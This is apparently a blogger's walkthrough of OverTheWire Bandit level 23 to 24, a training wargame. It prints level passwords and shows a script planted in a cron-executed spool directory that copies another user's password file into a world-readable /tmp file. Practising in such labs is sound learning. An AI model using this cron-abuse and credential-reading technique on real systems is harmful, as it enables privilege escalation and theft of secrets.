# Bandit walkthrough log [23 -> 24]

- Login

```
ssh bandit23@bandit.labs.overthewire.org -p 2220
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

- Level Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

- Solution

　今回の問題はかなり難しかったです。。。結構苦労しました。

では早速ソルーションへ行きます。

 Let's go to **/etc/cron.d/** as we always do and read the files that run with the permission of bandit24.(Because we are heading to 24!)

```
cd /etc/cron.d
cat cronjob_bandit24
```

![1](https://github.com/Narthy0301/Narthy0301.github.io/assets/172380852/6ed8ce46-4e7c-474b-b3fb-f27042bfabb2)

Arccoding to the file there is a shell script located in /usr/bin/cron

We can see that the script /usr/bin/cronjob_bandit24.sh is being executed every minute.

Let's check it out

```
cat /usr/bin/cronjob_bandit24.sh
```

The result is...

```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

as the code says, executing and deleting all scripts in /var/spool/$myname/foo directory every minute. So, we can use this scrpit. 

 All the scripts in the foo will be executed and deleted, so you just have to write and put the shell script in 'foo'.

 Then let's write the code to use. 

Before that we need to make temporary directory to use.

```
mkdir /tmp/homer
cd /tmp/homer
```

![1](https://github.com/Narthy0301/Narthy0301.github.io/assets/172380852/6a0bcd30-19ad-4bd2-8974-2a4c8bc24c6e)

It doesn't matter what you name the file.

We need to create an empty text file where your password will be stored.

```
touch pw.txt
```

and make a script named 'pass.sh'

```
vi pass.sh

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/homer/pw.txt
```

![1](https://github.com/Narthy0301/Narthy0301.github.io/assets/172380852/34f75c67-bbf9-45b4-9f43-497f3524ff88)

This script makes that /etc/bandit_pass/bandit24 goes to /tmp/homer/pw.txt

And set the permission of script to 777

```
chmod 777 pass.sh
```

Then move this file to

```
cp pass.sh /var/spool/bandit24/foo
```

After about a minute, the information of /etc/bandit_pass/bandit24 will be stored by the script.

![1](https://github.com/Narthy0301/Narthy0301.github.io/assets/172380852/e0039bf5-3f36-4024-b253-f2742bdbac27)

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

We can see a password for the next level !